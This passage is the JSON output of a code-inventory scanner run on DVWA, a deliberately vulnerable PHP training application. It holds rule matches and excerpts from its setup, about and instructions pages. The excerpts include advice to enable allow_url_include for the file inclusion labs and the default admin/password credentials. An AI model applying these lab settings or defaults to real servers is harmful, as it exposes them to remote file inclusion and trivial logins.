        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Logging.Call",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Class.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.Function.Defined",
        "count": 0,
        "includeAsMatch": false
      },
      {
        "tag": "Metric.Code.URL",
        "count": 0,
        "includeAsMatch": false
      }
    ],
    "detailedMatchList": [
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI026500",
        "ruleName": "Dependency: Included Source",
        "ruleDescription": "Dependency: Included Source",
        "pattern": "(include|require) .*",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Dependency.SourceInclude"
        ],
        "sample": "include",
        "excerpt": "\t&lt;br /&gt;\n\tIf you see disabled on either &lt;i&gt;allow_url_fopen&lt;/i&gt; or &lt;i&gt;allow_url_include&lt;/i&gt;, set the following in your php.ini file and restart Apache.&lt;br /&gt;\n\t&lt;pre&gt;&lt;code&gt;allow_url_fopen = On\nallow_url_include = On&lt;/code&gt;&lt;/pre&gt;\n\tThese are only required for the file inclusion labs so unless you want to play with those, you can ignore them.\n\n\t&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;\n\n\t&lt;!-- Create db button --&gt;\n",
        "startLocationLine": 85,
        "startLocationColumn": 11,
        "endLocationLine": 85,
        "endLocationColumn": 37
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "credentials",
        "excerpt": "\t&lt;h1&gt;Database Setup &lt;img src=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/images/spanner.png\\&quot; /&gt;&lt;/h1&gt;\n\n\t&lt;p&gt;Click on the &#39;Create / Reset Database&#39; button below to create or reset your database.&lt;br /&gt;\n\tIf you get an error make sure you have the correct user credentials in: &lt;em&gt;&quot; . realpath(  getcwd() . DIRECTORY_SEPARATOR . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/em&gt;&lt;/p&gt;\n\n\t&lt;p&gt;If the database already exists, &lt;em&gt;it will be cleared and the data will be reset&lt;/em&gt;.&lt;br /&gt;\n\tYou can also use this to reset the administrator credentials (\\&quot;&lt;em&gt;admin&lt;/em&gt; // &lt;em&gt;password&lt;/em&gt;\\&quot;) at any stage.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n",
        "startLocationLine": 44,
        "startLocationColumn": 58,
        "endLocationLine": 44,
        "endLocationColumn": 69
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI040100",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b((username|userid|password|passphrase|multi-factor|credential|acct)s?)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "credentials",
        "excerpt": "\tIf you get an error make sure you have the correct user credentials in: &lt;em&gt;&quot; . realpath(  getcwd() . DIRECTORY_SEPARATOR . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/em&gt;&lt;/p&gt;\n\n\t&lt;p&gt;If the database already exists, &lt;em&gt;it will be cleared and the data will be reset&lt;/em&gt;.&lt;br /&gt;\n\tYou can also use this to reset the administrator credentials (\\&quot;&lt;em&gt;admin&lt;/em&gt; // &lt;em&gt;password&lt;/em&gt;\\&quot;) at any stage.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;Setup Check&lt;/h2&gt;\n\n",
        "startLocationLine": 47,
        "startLocationColumn": 51,
        "endLocationLine": 47,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "credentials",
        "excerpt": "\t&lt;h1&gt;Database Setup &lt;img src=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;dvwa/images/spanner.png\\&quot; /&gt;&lt;/h1&gt;\n\n\t&lt;p&gt;Click on the &#39;Create / Reset Database&#39; button below to create or reset your database.&lt;br /&gt;\n\tIf you get an error make sure you have the correct user credentials in: &lt;em&gt;&quot; . realpath(  getcwd() . DIRECTORY_SEPARATOR . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/em&gt;&lt;/p&gt;\n\n\t&lt;p&gt;If the database already exists, &lt;em&gt;it will be cleared and the data will be reset&lt;/em&gt;.&lt;br /&gt;\n\tYou can also use this to reset the administrator credentials (\\&quot;&lt;em&gt;admin&lt;/em&gt; // &lt;em&gt;password&lt;/em&gt;\\&quot;) at any stage.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n",
        "startLocationLine": 44,
        "startLocationColumn": 58,
        "endLocationLine": 44,
        "endLocationColumn": 69
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI015800",
        "ruleName": "Data: Access Credentials",
        "ruleDescription": "Data: Access Credentials",
        "pattern": "\\b(username|userid|passphrase|secret|credential|credentials)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Data.Sensitive.Credentials"
        ],
        "sample": "credentials",
        "excerpt": "\tIf you get an error make sure you have the correct user credentials in: &lt;em&gt;&quot; . realpath(  getcwd() . DIRECTORY_SEPARATOR . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/em&gt;&lt;/p&gt;\n\n\t&lt;p&gt;If the database already exists, &lt;em&gt;it will be cleared and the data will be reset&lt;/em&gt;.&lt;br /&gt;\n\tYou can also use this to reset the administrator credentials (\\&quot;&lt;em&gt;admin&lt;/em&gt; // &lt;em&gt;password&lt;/em&gt;\\&quot;) at any stage.&lt;/p&gt;\n\t&lt;hr /&gt;\n\t&lt;br /&gt;\n\n\t&lt;h2&gt;Setup Check&lt;/h2&gt;\n\n",
        "startLocationLine": 47,
        "startLocationColumn": 51,
        "endLocationLine": 47,
        "endLocationColumn": 62
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\n\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;setup.php&#39; );\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tinclude_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/MySQL.php&#39;;\n\t}\n\telseif($DBMS == &#39;PGSQL&#39;) {\n\t\t// include_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/PGSQL.php&#39;;\n\t\tdvwaMessagePush( &#39;PostgreSQL is not yet fully supported.&#39; );\n",
        "startLocationLine": 22,
        "startLocationColumn": 16,
        "endLocationLine": 22,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/setup.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "MySQL",
        "excerpt": "\tcheckToken( $_REQUEST[ &#39;user_token&#39; ], $session_token, &#39;setup.php&#39; );\n\n\tif( $DBMS == &#39;MySQL&#39; ) {\n\t\tinclude_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/MySQL.php&#39;;\n\t}\n\telseif($DBMS == &#39;PGSQL&#39;) {\n\t\t// include_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/DBMS/PGSQL.php&#39;;\n\t\tdvwaMessagePush( &#39;PostgreSQL is not yet fully supported.&#39; );\n\t\tdvwaPageReload();\n",
        "startLocationLine": 23,
        "startLocationColumn": 60,
        "endLocationLine": 23,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/instructions.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "obfuscate",
        "excerpt": "\treturn dvwaExternalLinkUrlGet( $matches[1] );\n}\n\n// Make links and obfuscate the referer...\n$instructions = preg_replace_callback(\n\t&#39;/((http|https|ftp):\\/\\/([[:alnum:]|.|\\/|?|=]+))/&#39;,\n\t&#39;urlReplace&#39;,\n\t$instructions\n);\n",
        "startLocationLine": 32,
        "startLocationColumn": 19,
        "endLocationLine": 32,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/instructions.php",
        "ruleId": "AI031600",
        "ruleName": "Network Connection: FTP, Telnet or Similar",
        "ruleDescription": "Network Connection",
        "pattern": "\\b(tftp|ntp\\.org|ntpupdate|imap|snmp|ftps|sftp|ftp|nntp|smtp|telnet|ssh|pop3|gopher)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "OS.Network.Connection.Miscellaneous"
        ],
        "sample": "ftp",
        "excerpt": "\n// Make links and obfuscate the referer...\n$instructions = preg_replace_callback(\n\t&#39;/((http|https|ftp):\\/\\/([[:alnum:]|.|\\/|?|=]+))/&#39;,\n\t&#39;urlReplace&#39;,\n\t$instructions\n);\n\n$instructions = nl2br( $instructions );\n",
        "startLocationLine": 34,
        "startLocationColumn": 17,
        "endLocationLine": 34,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI029500",
        "ruleName": "Platform: Linux",
        "ruleDescription": "Platform: Linux",
        "pattern": "\\b(linux|xubuntu|ubuntu|coreos|manjaro|archlinux|debian|mint|gentoo|opensuse|redhat|mandrake|mandriva|slackware)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Linux.Distro"
        ],
        "sample": "linux",
        "excerpt": "\t\t&lt;li&gt;Craig&lt;/li&gt;\n\t\t&lt;li&gt;g0tmi1k: &quot; . dvwaExternalLinkUrlGet( &#39;https://blog.g0tmi1k.com/&#39;,&#39;g0tmi1k.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Jamesr: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.creativenucleus.com/&#39;,&#39;www.creativenucleus.com&#39; ) . &quot; / &quot; . dvwaExternalLinkUrlGet( &#39;http://www.designnewcastle.co.uk/&#39;,&#39;www.designnewcastle.co.uk&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Jason Jones: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.linux-ninja.com/&#39;,&#39;www.linux-ninja.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;RandomStorm: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.randomstorm.com/&#39;,&#39;www.randomstorm.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Ryan Dewhurst: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.dewhurstsecurity.com/&#39;,&#39;www.dewhurstsecurity.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Shinkurt: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.paulosyibelo.com/&#39;,&#39;www.paulosyibelo.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Tedi Heriyanto: &quot; . dvwaExternalLinkUrlGet( &#39;http://tedi.heriyanto.net/&#39;,&#39;tedi.heriyanto.net&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Tom Mackenzie: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.tmacuk.co.uk/&#39;,&#39;www.tmacuk.co.uk&#39; ) . &quot;&lt;/li&gt;\n",
        "startLocationLine": 35,
        "startLocationColumn": 60,
        "endLocationLine": 35,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI029500",
        "ruleName": "Platform: Linux",
        "ruleDescription": "Platform: Linux",
        "pattern": "\\b(linux|xubuntu|ubuntu|coreos|manjaro|archlinux|debian|mint|gentoo|opensuse|redhat|mandrake|mandriva|slackware)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Linux.Distro"
        ],
        "sample": "linux",
        "excerpt": "\t\t&lt;li&gt;Craig&lt;/li&gt;\n\t\t&lt;li&gt;g0tmi1k: &quot; . dvwaExternalLinkUrlGet( &#39;https://blog.g0tmi1k.com/&#39;,&#39;g0tmi1k.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Jamesr: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.creativenucleus.com/&#39;,&#39;www.creativenucleus.com&#39; ) . &quot; / &quot; . dvwaExternalLinkUrlGet( &#39;http://www.designnewcastle.co.uk/&#39;,&#39;www.designnewcastle.co.uk&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Jason Jones: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.linux-ninja.com/&#39;,&#39;www.linux-ninja.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;RandomStorm: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.randomstorm.com/&#39;,&#39;www.randomstorm.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Ryan Dewhurst: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.dewhurstsecurity.com/&#39;,&#39;www.dewhurstsecurity.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Shinkurt: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.paulosyibelo.com/&#39;,&#39;www.paulosyibelo.com&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Tedi Heriyanto: &quot; . dvwaExternalLinkUrlGet( &#39;http://tedi.heriyanto.net/&#39;,&#39;tedi.heriyanto.net&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Tom Mackenzie: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.tmacuk.co.uk/&#39;,&#39;www.tmacuk.co.uk&#39; ) . &quot;&lt;/li&gt;\n",
        "startLocationLine": 35,
        "startLocationColumn": 83,
        "endLocationLine": 35,
        "endLocationColumn": 88
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI027900",
        "ruleName": "Open Source License: GPL",
        "ruleDescription": "Open Source License: GPL",
        "pattern": "\\b(GNU\\ GENERAL\\ PUBLIC\\ LICENSE)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.OpenSourceLicense.GPL"
        ],
        "sample": "GNU General Public License",
        "excerpt": "\n\t&lt;h2&gt;License&lt;/h2&gt;\n\t&lt;p&gt;Damn Vulnerable Web Application (DVWA) is free software: you can redistribute it and/or modify\n\tit under the terms of the GNU General Public License as published by\n\tthe Free Software Foundation, either version 3 of the License, or\n\t(at your option) any later version.&lt;/p&gt;\n\t&lt;p&gt;The PHPIDS library is included, in good faith, with this DVWA distribution. The operation of PHPIDS is provided without support from the DVWA team. It is licensed under &lt;a href=\\&quot;&quot; . DVWA_WEB_PAGE_TO_ROOT . &quot;instructions.php?doc=PHPIDS-license\\&quot;&gt;separate terms&lt;/a&gt; to the DVWA code.&lt;/p&gt;\n\n\t&lt;h2&gt;Development&lt;/h2&gt;\n",
        "startLocationLine": 48,
        "startLocationColumn": 28,
        "endLocationLine": 48,
        "endLocationColumn": 54
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\t&lt;h2&gt;Links&lt;/h2&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;Homepage: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.dvwa.co.uk/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Project Home: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Bug Tracker: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/issues&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Souce Control: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/commits/master&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Wiki: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/wiki&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\n",
        "startLocationLine": 23,
        "startLocationColumn": 58,
        "endLocationLine": 23,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\t&lt;ul&gt;\n\t\t&lt;li&gt;Homepage: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.dvwa.co.uk/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Project Home: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Bug Tracker: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/issues&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Souce Control: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/commits/master&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Wiki: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/wiki&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\n\t&lt;h2&gt;Credits&lt;/h2&gt;\n",
        "startLocationLine": 24,
        "startLocationColumn": 57,
        "endLocationLine": 24,
        "endLocationColumn": 63
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\t\t&lt;li&gt;Homepage: &quot; . dvwaExternalLinkUrlGet( &#39;http://www.dvwa.co.uk/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Project Home: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Bug Tracker: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/issues&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Souce Control: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/commits/master&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Wiki: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/wiki&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\n\t&lt;h2&gt;Credits&lt;/h2&gt;\n\t&lt;ul&gt;\n",
        "startLocationLine": 25,
        "startLocationColumn": 59,
        "endLocationLine": 25,
        "endLocationColumn": 65
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/about.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\t\t&lt;li&gt;Project Home: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Bug Tracker: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/issues&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Souce Control: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/commits/master&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;Wiki: &quot; . dvwaExternalLinkUrlGet( &#39;https://github.com/RandomStorm/DVWA/wiki&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\n\t&lt;h2&gt;Credits&lt;/h2&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;Brooks Garrett: &quot; . dvwaExternalLinkUrlGet( &#39;http://brooksgarrett.com/&#39;,&#39;www.brooksgarrett.com&#39; ) . &quot;&lt;/li&gt;\n",
        "startLocationLine": 26,
        "startLocationColumn": 50,
        "endLocationLine": 26,
        "endLocationColumn": 56
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
